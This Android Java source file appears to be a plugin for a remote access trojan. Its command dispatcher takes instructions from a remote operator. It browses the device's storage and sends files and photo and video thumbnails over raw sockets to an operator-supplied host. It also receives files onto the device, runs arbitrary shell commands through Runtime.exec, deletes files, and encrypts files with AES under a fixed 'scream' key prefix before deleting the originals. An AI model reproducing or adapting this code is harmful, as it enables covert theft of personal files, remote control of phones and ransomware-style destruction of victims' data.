package plugens.angel.plugens;
import android.annotation.SuppressLint;
import android.app.WallpaperManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.content.res.Resources;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.graphics.RectF;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.media.MediaMetadataRetriever;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.ParcelFileDescriptor;
import android.webkit.MimeTypeMap;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.SocketTimeoutException;
import java.net.UnknownHostException;
import java.nio.charset.Charset;
import java.security.InvalidKeyException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.Executor;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.zip.GZIPOutputStream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import java.util.zip.ZipOutputStream;
import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.CipherOutputStream;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;
public class files {
    private static String SPL_DATA = "x0D0x";
    private static String SPL_ARRAY = "x0A0x";
    private static String SPL_LINE = "x0L0x";
    private static String OBJ = "<Object>";
    private static Executor ec = null;
    private static int max = 1000;
    public Object method(Context c, String s, byte[] b) throws IOException, InvalidKeyException, NoSuchAlgorithmException, NoSuchPaddingException {
        byte[] f = "null".getBytes();
        String[] d = s.split(SPL_DATA);
        if (ec == null){
            ec  = new ThreadPoolExecutor(8, 8 + 4, 1,
                    TimeUnit.MINUTES, new ArrayBlockingQueue<Runnable>(max));
        }
        switch(d[0]){
            case "files":
                try {
                    StringBuffer sb = new StringBuffer();
                    String p = d[1];
                    if (p.equals("get0")) {
                        p = Environment.getExternalStorageDirectory().getPath();
                    }else if(p.equals("get1")) {
                        p = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).toString();
                    }else if(p.equals("get2")) {
                        p = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES).toString();
                    }else if(p.equals("get3")) {
                        p = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).toString();
                    }
                    File pl = new File(p);
                    if (pl.isDirectory()) {
                        String gp = pl.getPath();
                        File[] lst = pl.listFiles();
                        if (lst != null && lst.length > 0) {
                            for (int i = 0; i < lst.length; i++) {
                                try {
                                    String name = lst[i].getName();
                                    long size = lst[i].length();
                                    String date = "n/a";
                                    String LastModified;
                                    try{
                                        File file = new File(lst[i].getPath());
                                        SimpleDateFormat sdf = new SimpleDateFormat("MM/dd/yyyy EEE" , Locale.ENGLISH);
                                        date = new SimpleDateFormat("MM/dd/yyyy EEE", Locale.ENGLISH).format(new Date());
                                        LastModified = sdf.format(file.lastModified());

                                    }catch(Exception e){
                                        LastModified = "n/a";
                                    }
                                    String exe = "n/a";
                                    String cou = "n/a";
                                    if (lst[i].isDirectory()) {
                                        File[] is_null = lst[i].listFiles();
                                        cou = String.valueOf(is_null.length);
                                        exe = "0";
                                    } else if (lst[i].isFile()) {
                                        exe = "1";
                                    }
                                    sb.append("1" + SPL_ARRAY + exe + SPL_ARRAY + name + SPL_ARRAY + String.valueOf(size) + SPL_ARRAY + gp + SPL_ARRAY + LastModified + SPL_ARRAY + date + SPL_ARRAY + cou + SPL_LINE);
                                } catch (Exception e) {}
                            }

                        } else {
                            sb.append("-1" + SPL_ARRAY + gp + SPL_LINE);
                        }
                    }
                    String s0 = OBJ + SPL_DATA + sb.toString() ;
                    f =  s0.getBytes();
                    return f;
                } catch (Exception e) {}
                break;
            case "download":
                DownManager(d[1],d[2],d[3],d[4],d[5],d[6]);
                break;
            case "upload":
                Upload(d[1],d[2],d[3],d[4],d[5],d[6],d[7],d[8]);
                break;
            case "small":
                SmallShot(d[1],d[2],d[3],d[4],d[5],d[6],c);
                break;
            case "encrypt":
                encrypt(d[1], d[3],d[2]);
                break;
            case "decrypt":
                decrypt(d[1], d[3],d[2]);
                break;
            case "del0":
                FileDelete(d[1]);
                break;
            case "del1":
                _commend(d[1]);
                break;
            case "edit":
                StringBuilder sb = new StringBuilder();
                try {File fi = new File(d[1]);
                        if(fi.exists()){
                            BufferedReader br = new BufferedReader(new FileReader(fi));
                            String Ln;
                            if (fi.length() != 0) {
                                while ((Ln = br.readLine()) != null) {
                                    sb.append(Ln);
                                    sb.append('\n');
                                }
                                int l = sb.lastIndexOf("\n");
                                if (l >= 0) {sb.delete(l, sb.length());}
                            }
                            br.close();
                            String s0 = OBJ + SPL_DATA + sb.toString() + SPL_DATA + d[1] ;
                            f = s0.getBytes();
                            return f;
                        }
                    } catch (Exception e) {}
                break;
            case "save":
                sev(d[1],d[2]);
                break;
            case "zip":
                String ls[] = d[1].split(SPL_LINE);
                zip(ls,d[2]);
                break;
            case "unzip":
                unzip(d[1],d[2]);
                break;
            case "rename":
                rename(d[1],d[2]);
                break;
            case "create":
                create(d[1],d[2]);
                break;
            case "open":
                if(tr(c,d[1],d[2]) != true){
                    rn(c,d[1],d[2]);
                }
                break;
            case "empty":
                empty(d[1]);
                break;
            case "commend":
                _commend(d[1]);
                break;
            case "set_wallpaper":
                SetWallpaper(c,d[1]);
                break;
            case "play_back":
                PlayBack(c,d[1]);
                break;
        }
        return f;
    }




    @SuppressLint("MissingPermission")
    private void SetWallpaper(Context ctx, String path){
            try {
                Uri ur = Uri.parse((path).trim());
                File file = new File(ur.getPath());
                if (file.exists()){
                    Bitmap b = BitmapFactory.decodeFile(path);
                    if (b == null){
                        return ;
                    }
                    WallpaperManager wm =  WallpaperManager.getInstance(ctx);
                    wm.setBitmap(b);
                    try{
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                            wm.setBitmap(b, null, true, WallpaperManager.FLAG_LOCK);
                        }
                    } catch (Exception e) {}
                }
            } catch (Exception e) {}
    }

    private MediaPlayer mp;
    public void PlayBack(Context ctx,String path) {
            try {
                File f = new File(path);
                if (!f.exists()){
                    return;
                }
                if (mp != null) {
                    StopMediaPlayer();
                }
                mp = MediaPlayer.create(ctx, Uri.parse(path));
                if (mp == null){
                    return;
                }
                mp.start();
            } catch (Exception e) {}
    }
    private void StopMediaPlayer() {
        try {
            if (mp !=null) {
                try {
                    mp.stop();
                } catch (RuntimeException e) {}
                mp.release();
                mp = null;
            }
        } catch (Exception e) {}
    }

    private static void _commend(final String commend) {
        try {
            String encoded = new String(commend.getBytes("utf-8"));
            String[] cmd = encoded.split(" ");
            String space = "(U+0020)".toLowerCase();
            for (int i = 0 ; i < cmd.length ; i++){
               if(cmd[i].contains(space)){
                   cmd[i] = cmd[i].replace(space," ");
               }
            }
                    Runtime runtime = Runtime.getRuntime();
                    runtime.exec(cmd);
        } catch (Exception e) {}
    }
    private boolean isApp(Context ctx, String pk) {
        try{
        PackageManager pm = ctx.getPackageManager();
        try {
            pm.getPackageInfo(pk, PackageManager.GET_ACTIVITIES);
            return pm.getApplicationInfo(pk, 0).enabled;
        }
        catch (PackageManager.NameNotFoundException e) {
            return false;
        }
        } catch (Exception e) {}
        return false;
    }
    private Boolean tr(Context ctx, String p, String ext2){
   try{
        MimeTypeMap map = MimeTypeMap.getSingleton();
        String type = map.getMimeTypeFromExtension(ext2);
        if (type == null){
            type = "*/*";
        }
        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setType(type);
        PackageManager pm = ctx.getPackageManager();
        List<ResolveInfo> act = pm.queryIntentActivities(intent, 0);
        int flag = 0;
        String A1 = "com.google.android.apps.photos";
        String A2 = "com.google.android.music";
        if(type.startsWith("image/") || type.startsWith("video/")){
           if (isApp(ctx ,A1)){
               intent.setPackage(A1);
           }else{
               flag = -1;
           }
        } else if (type.startsWith("audio/")){
           if (isApp(ctx ,A2)){
               intent.setPackage(A2);
           }else{
               flag = -1;
           }
        }else{
           if (act.size() > 0) {
               intent.setPackage(act.get(0).activityInfo.packageName);
           }else{
               flag = -1;
           }

       }

       if (flag == -1){
           return false;
       }else{
           intent.setDataAndType(Uri.parse(p), type);
           intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
           ctx.startActivity(intent);
           return true;
       }

    } catch (Exception e) {}
    return false;
    }
    private void rn(Context ctx,String p,String ext2){
    try{
        File file = new File(p);
        MimeTypeMap map = MimeTypeMap.getSingleton();
        String type = map.getMimeTypeFromExtension(ext2);
        if (type == null){
            type = "*/*";
        }
        Intent intent = new Intent(Intent.ACTION_VIEW);
        Uri data = Uri.fromFile(file);
        intent.setDataAndType(data, type);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        ctx.startActivity(intent);
    } catch (Exception e) {}
  }
    private void create(final String p, final String v) {
        try {
            File file = new File(p);
            if (!file.exists()){
                if (v.startsWith("True")) {
                    file.mkdirs();
                } else {
                    file.createNewFile();
                }
            }
        } catch (Exception e) {}
    }
    private void empty(final String p) {
            try {
                File f = new File(p);
                if(f.exists()){
                        PrintWriter writer = new PrintWriter(f);
                        writer.print("");
                        writer.close();
                }
            } catch (Exception e) {}
    }
    private void sev(final String p, final String v) {
                try {
                    try {
                        File f = new File(p);
                        if(f.exists()){
                                FileWriter wr = new FileWriter(f);
                                wr.append(v);
                                wr.close();
                        }
                    } catch (Exception e) {}
                }catch(OutOfMemoryError e){}
    }
    private static final String scream = "scream";
    private void Upload(final String h ,final String p, final String path, final String si ,final String nm,final String fnm,final String key0,final String key1){
        if (((ThreadPoolExecutor) ec).getActiveCount() >= max){
            return;
        }
         ec.execute(new Runnable() {
        public void run() {
            Socket sk = null;
            OutputStream out = null;
            DataInputStream in = null;
            FileOutputStream FS = null ;
            boolean ctd = false;
            Object Syn_x1 = new Object();
            Object Syn_x2 = new Object();
            int test = 0;
            do {
                if (test >= 3){
                    return;
                }
                try {
                    InetAddress ip;
                    ip = InetAddress.getByName(h);
                    InetSocketAddress sock = new InetSocketAddress(ip, Integer.valueOf(p));
                    sk = new Socket();
                    sk.setSoTimeout(0);
                    sk.setKeepAlive(true);
                    sk.connect(sock, 60000);
                    ctd = sk.isConnected();
                    if (ctd == true) {
                        sk.setSendBufferSize(1023);
                        sk.setReceiveBufferSize(1023);
                        out = sk.getOutputStream();
                        synchronized (Syn_x1){
                            if(out != null){
                                String info = path + SPL_ARRAY + si + SPL_ARRAY + nm +  SPL_ARRAY + fnm;
                                byte[] b0 = f(key0,info.getBytes());
                                sk.setSendBufferSize(b0.length);
                                out = sk.getOutputStream();
                                in = new DataInputStream(new BufferedInputStream(sk.getInputStream()));
                                out.write(b0,0,b0.length);
                            }
                        }
                        break;
                    }
                } catch (UnknownHostException e) {
                    di(sk,out,in);
                } catch (SocketException e) {
                    di(sk,out,in);
                } catch (Exception e) {
                    di(sk,out,in);
                }
                test++;
                try{ Thread.sleep(1);} catch (InterruptedException e) {}
            } while (ctd == false);

            int read;
            int siz0 = 0;
            int siz1 = Integer.valueOf(si);
            try{
            byte[] buff = new byte[4096];
            File f = new File(path);
            FS = new FileOutputStream(f);
            sk.setReceiveBufferSize(buff.length);
            while ((read = in.read(buff)) > 0)
            {
                synchronized (Syn_x2){
                    FS.write(buff, 0, read);
                    siz0+=read;
                    if (siz0 >= siz1){
                        break;
                    }
                }
            }
            }catch (SocketException e) {
            }catch (SocketTimeoutException s) {
            }catch(OutOfMemoryError e){
            }catch (Exception e) {}
            try {
                if(FS != null){
                    FS.close();
                }
            } catch (IOException e) {}
            try{ Thread.sleep(9000L);} catch (InterruptedException e) {}
            di(sk,out,in);
        }});
    }
    private void DownManager(final String h ,final String p, final String path,final String key0,final String key1,final String uuid){
        if (((ThreadPoolExecutor) ec).getActiveCount() >= max){
            return;
        }
        ec.execute(new Runnable() {
        public void run() {
            Socket sk = null;
            OutputStream out = null;
            DataInputStream in = null;
            boolean ctd = false;
            Object Syn_x1 = new Object();
            Uri url = Uri.parse((path).trim());
            File f = new File(url.getPath());
            if (!f.exists()) {
                return;
            }
            int test = 0;
            do {
                if (test >= 3){
                    return;
                }
                try {
                    InetAddress ip;
                    ip = InetAddress.getByName(h);
                    InetSocketAddress sock = new InetSocketAddress(ip, Integer.valueOf(p));
                    sk = new Socket();
                    sk.setSoTimeout(0);
                    sk.setKeepAlive(true);
                    sk.connect(sock, 60000);
                    ctd = sk.isConnected();
                    if (ctd == true) {
                        sk.setSendBufferSize(1023);
                        sk.setReceiveBufferSize(1023);
                        out = sk.getOutputStream();
                        synchronized (Syn_x1){
                            if(out != null){
                                long size = f.length();
                                String info = path + SPL_ARRAY + size + SPL_ARRAY + uuid ;
                                byte[] b0 = f(key0,info.getBytes());
                                sk.setSendBufferSize(b0.length);
                                out = sk.getOutputStream();
                                out.write(b0,0,b0.length);
                            }
                        }
                        break;
                    }
                } catch (UnknownHostException e) {
                    di(sk,out,in);
                } catch (SocketException e) {
                    di(sk,out,in);
                } catch (Exception e) {
                    di(sk,out,in);
                }
                test++;
                try{ Thread.sleep(1);} catch (InterruptedException e) {}
            } while (ctd == false);

            try {
                if (sk != null) {
                    if (out != null) {
                        Uri ur = Uri.parse((path).trim());
                        File file = new File(ur.getPath());
                        if (file.exists()) {
                            long size = file.length();
                            FileInputStream FIS = null;
                            FIS = new FileInputStream(file);
                            int BufferSize ;
                            BufferSize = (int) buff(size);
                            try {
                                byte[] ByteBuffer = new byte[BufferSize];
                                int i = 0;
                                ByteArrayOutputStream BOS = new ByteArrayOutputStream();
                                while ((i = FIS.read(ByteBuffer, 0, ByteBuffer.length)) != -1) {
                                    synchronized (Syn_x1){
                                        if(out != null){
                                            BOS.write(ByteBuffer, 0, i);
                                            byte[] b0 = f( key1,BOS.toByteArray());
                                            sk.setSendBufferSize(b0.length);
                                            out = sk.getOutputStream();
                                            out.write(b0,0,b0.length);
                                            BOS.reset();
                                        }
                                    }
                                }
                                FIS.close();
                            } catch (OutOfMemoryError e) {
                            }
                        }
                    }
                }
            } catch (Exception e) {
            } catch (OutOfMemoryError e) {
            }
            try{ Thread.sleep(9000L);} catch (InterruptedException e) {}
            di(sk,out,in);
        }});
    }
    private void SmallShot(final String h ,final String p, final String path,final String status,final String Quality,final String key0,final Context ctx){
        if (((ThreadPoolExecutor) ec).getActiveCount() >= max){
            return;
        }
        ec.execute(new Runnable() {
        public void run() {
            Socket sk = null;
            OutputStream out = null;
            DataInputStream in = null;
            boolean ctd = false;
            Object Syn_x1 = new Object();
            int test = 0;
            do {
                if (test >= 3){
                    return;
                }
                try {
                    InetAddress ip;
                    ip = InetAddress.getByName(h);
                    InetSocketAddress sock = new InetSocketAddress(ip, Integer.valueOf(p));
                    sk = new Socket();
                    sk.setSoTimeout(0);
                    sk.setKeepAlive(true);
                    sk.connect(sock, 60000);
                    ctd = sk.isConnected();
                    if (ctd == true) {
                        sk.setSendBufferSize(1023);
                        sk.setReceiveBufferSize(1023);
                        out = sk.getOutputStream();
                        break;
                    }
                } catch (UnknownHostException e) {
                    di(sk,out,in);
                } catch (SocketException e) {
                    di(sk,out,in);
                } catch (Exception e) {
                    di(sk,out,in);
                }
                test++;
                try{ Thread.sleep(1);} catch (InterruptedException e) {}
            } while (ctd == false);

            if (ctd == true) {
                try{
                    int Qul = Integer.valueOf(Quality);
                    Uri ur = Uri.parse((path).trim());
                    File file = new File(ur.getPath());
                    if (file.exists() && file.length() > 0) {
                        if (status.equals("true")) {
                            MediaMetadataRetriever ret = new MediaMetadataRetriever();
                            if (ret != null) {
                                ret.setDataSource(file.getPath());
                                MediaPlayer mp = MediaPlayer.create(ctx, ur);
                                long millis = mp.getDuration();
                                int i = 1000 * 1000;
                                while (i < millis * 1000) {
                                    if (file.exists()) {
                                        String duration = ret.extractMetadata(MediaMetadataRetriever.METADATA_KEY_DURATION);
                                        Bitmap bitmap0 = ret.getFrameAtTime(i, MediaMetadataRetriever.OPTION_CLOSEST_SYNC);
                                        Bitmap bitmap1 = scaleCenterCrop(bitmap0 , 128, 128);
                                        if (bitmap1 != null) {
                                            try {
                                                Bitmap bitmap = Bitmap.createScaledBitmap(bitmap1, 128, 128, true);
                                                ByteArrayOutputStream BOS = new ByteArrayOutputStream();
                                                bitmap.compress(Bitmap.CompressFormat.JPEG, Qul, BOS);
                                                synchronized (Syn_x1) {
                                                    if (out != null) {
                                                        String info = key0 + SPL_ARRAY + path + SPL_ARRAY + status + SPL_ARRAY + duration ;
                                                        byte[] b0 = f(info, BOS.toByteArray());
                                                        sk.setSendBufferSize(b0.length);
                                                        out = sk.getOutputStream();
                                                        out.write(b0, 0, b0.length);
                                                    }
                                                }
                                            } catch (Exception e) {
                                                break;
                                            }
                                        }
                                    }
                                    i += 1000 * 1000;
                                }
                                mp.release();
                            }
                        }else{
                            Drawable photo = null;
                            Bitmap bmp = BitmapFactory.decodeFile(file.getPath());
                            photo = new BitmapDrawable(Resources.getSystem(), bmp);
                            if (photo != null) {
                                BitmapDrawable BD = (BitmapDrawable) photo;
                                Bitmap bitmap = scaleCenterCrop(BD.getBitmap(), 356, 356);
                                ByteArrayOutputStream BOS = new ByteArrayOutputStream();
                                bitmap.compress(Bitmap.CompressFormat.JPEG, Qul, BOS);
                                synchronized (Syn_x1) {
                                    if (out != null) {
                                        String info = key0 + SPL_ARRAY + path + SPL_ARRAY + status + SPL_ARRAY + 0  ;
                                        byte[] b0 = f(info, BOS.toByteArray());
                                        sk.setSendBufferSize(b0.length);
                                        out = sk.getOutputStream();
                                        out.write(b0, 0, b0.length);
                                    }
                                }
                            }
                        }
                    }
                }catch (SocketException e) {
                }catch (SocketTimeoutException s) {
                }catch(OutOfMemoryError e){
                }catch (Exception e) {}
            }

            try{ Thread.sleep(9000L);} catch (InterruptedException e) {}
            di(sk,out,in);
        }});
    }
    private static void encrypt(String path,String pass,String con) throws IOException, NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException {
        FileInputStream fis = new FileInputStream(path);
        FileOutputStream fos = new FileOutputStream(path.concat(con));
        byte[] key = (scream + pass).getBytes("UTF-8");
        MessageDigest sha = MessageDigest.getInstance("SHA-1");
        key = sha.digest(key);
        key = Arrays.copyOf(key,16);
        SecretKeySpec sks = new SecretKeySpec(key, "AES");
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.ENCRYPT_MODE, sks);
        CipherOutputStream cos = new CipherOutputStream(fos, cipher);
        int b;
        byte[] d = new byte[8];
        while((b = fis.read(d)) != -1) {
            cos.write(d, 0, b);
        }
        cos.flush();
        cos.close();
        fis.close();
        FileDelete(path);
    }
    private static void FileDelete(final String path) {
            try {
                File file = new File(path);
                if (file.exists()){
                    file.delete();
                }
            } catch (Exception e) {}
    }

    private static void rename(final String OldPath, final String NewPath) {
        try {
            File F1 = new File(OldPath);
            if (F1.exists()) {
                File F2 = new File(NewPath);
                F1.renameTo(F2);
            }
        } catch (Exception e) {
        }
    }
    private static void zip(final String[] lst, final String path) {
                try {
                    File file = new File(path);
                    if (!file.exists()){
                        file.createNewFile();
                    }
                    BufferedInputStream origin;
                    FileOutputStream dest = new FileOutputStream(file.getPath());
                    ZipOutputStream out = new ZipOutputStream(new BufferedOutputStream(dest));
                    for (int i = 0; i < lst.length; i++) {
                        File o = new File(lst[i]);
                        if (!o.isDirectory()){
                            long Buff = buff(o.length());

                            Long x = Buff;
                            int s = x.intValue();
                            byte data[] = new byte[s];

                            FileInputStream fi = new FileInputStream(lst[i]);
                            origin = new BufferedInputStream(fi, s);
                            ZipEntry entry = new ZipEntry(lst[i].substring(lst[i].lastIndexOf("/") + 1));

                            out.putNextEntry(entry);
                            int count;
                            while ((count = origin.read(data, 0, s)) != -1) {
                                out.write(data, 0, count);
                            }
                            origin.close();
                        }
                    }
                    out.close();
                } catch (Exception e) {}
    }

    private static void unzip(final String path, final String here) {
                File file = new File(here);
                if (file.exists()){
                    try {
                        FileInputStream FIS = new FileInputStream(path);
                        ZipInputStream ZIS;
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
                            ZIS = new ZipInputStream(FIS, Charset.forName("Cp437"));
                        }else{
                            ZIS = new ZipInputStream(FIS);
                        }
                        ZipEntry ZE ;
                        while ((ZE = ZIS.getNextEntry()) != null) {
                            String p = here + ZE.getName();
                            File dir0 = new File(p);
                            if (dir0.isDirectory()){
                                if (!dir0.exists()) {dir0.mkdirs();}
                            }else{
                                int c;
                                String n = "";
                                for (c = p.length()-1 ; c >= 0 ; c--){
                                    if(String.valueOf(p.charAt(c)).equals("/") ){
                                        n = p.substring(0, c);
                                        break;
                                    }
                                }
                                File dir1 = new File(n);
                                if (!dir1.exists()) {dir1.mkdirs();}
                            }
                            File o = new File(here + ZE.getName());
                            if (!o.isDirectory()){
                                FileOutputStream f = new FileOutputStream(here + ZE.getName());
                                long Buff = buff(o.length());
                                Long x = Buff;
                                int s = x.intValue();
                                byte data[] = new byte[s];
                                int count;
                                while ((count = ZIS.read(data, 0, s)) != -1) {
                                    f.write(data, 0, count);
                                }
                                ZIS.closeEntry();
                                f.close();
                            }
                        }
                        ZIS.close();
                    } catch (Exception e) {}
                }
    }

    private static void decrypt(String path,String pass, String outPath) throws IOException, NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException {
        FileInputStream fis = new FileInputStream(path);
        FileOutputStream fos = new FileOutputStream(outPath);
        byte[] key = (scream + pass).getBytes("UTF-8");
        MessageDigest sha = MessageDigest.getInstance("SHA-1");
        key = sha.digest(key);
        key = Arrays.copyOf(key,16);
        SecretKeySpec sks = new SecretKeySpec(key, "AES");
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.DECRYPT_MODE, sks);
        CipherInputStream cis = new CipherInputStream(fis, cipher);
        int b;
        byte[] d = new byte[8];
        while((b = cis.read(d)) != -1) {
            fos.write(d, 0, b);
        }
        fos.flush();
        fos.close();
        cis.close();
        FileDelete(path);
    }
    private Bitmap scaleCenterCrop(Bitmap source, int newHeight, int newWidth) {
        int sourceWidth = source.getWidth();
        int sourceHeight = source.getHeight();
        float xScale = (float) newWidth / sourceWidth;
        float yScale = (float) newHeight / sourceHeight;
        float scale = Math.max(xScale, yScale);
        float scaledWidth = scale * sourceWidth;
        float scaledHeight = scale * sourceHeight;
        float left = (newWidth - scaledWidth) / 2;
        float top = (newHeight - scaledHeight) / 2;
        RectF targetRect = new RectF(left, top, left + scaledWidth, top + scaledHeight);
        Bitmap dest = Bitmap.createBitmap(newWidth, newHeight, source.getConfig());
        Canvas canvas = new Canvas(dest);
        canvas.drawBitmap(source, null, targetRect, null);
        return dest;
    }
    private void di(Socket sk,OutputStream out,DataInputStream in) {
        try {sk.shutdownOutput();} catch (SocketException e) {} catch (IOException e) {}
        try {sk.shutdownInput();} catch (SocketException e) {} catch (IOException e) {}
        try {sk.getOutputStream().close();} catch (SocketException e) {} catch (IOException e) {}
        try {sk.getInputStream().close();} catch (SocketException e) {} catch (IOException e) {}
        try {sk.close();} catch (SocketException e) {} catch (IOException e) {}
        if(out != null){try {out.close();} catch (SocketException e) {} catch (IOException e) {}out = null;}
        if(in != null){try {in.close();} catch (SocketException e) {} catch (IOException e) {}in = null;}
    }
    private byte[] f(String s,byte[] b) throws Exception{
        ByteArrayOutputStream o = new ByteArrayOutputStream() ;
        byte[] s0 = cZp(s.getBytes());
        byte[] b0 = cZp(b);
        byte ch = (byte)0;
        byte[] n0 = String.valueOf(s0.length).getBytes();
        byte[] n1 = String.valueOf(b0.length).getBytes();
        o.write(n0, 0, n0.length);
        o.write(ch);
        o.write(n1, 0, n1.length);
        o.write(ch);
        o.write(s0, 0, s0.length);
        o.write(b0, 0, b0.length);
        byte[] b1 = o.toByteArray();
        try {o.close(); } catch (IOException ex) {}
        return b1;
    }
    private byte[] cZp( byte[] d) throws IOException {
        ByteArrayOutputStream b = new ByteArrayOutputStream(d.length);
        GZIPOutputStream g = new GZIPOutputStream(b);
        g.write(d);
        g.close();
        byte[] m = b.toByteArray();
        b.close();
        return m;
    }
    private static long buff(long BufferSize){
        if(BufferSize >=1024000){
            BufferSize = 102400;
        }else if(BufferSize >= 512000){
            BufferSize = 51200;
        }else if(BufferSize >= 204800) {
            BufferSize = 20480;
        }else if(BufferSize >= 1024) {
            BufferSize = 1024;
        }else{
            BufferSize = 512 ;
        }
        return  BufferSize;
    }
}
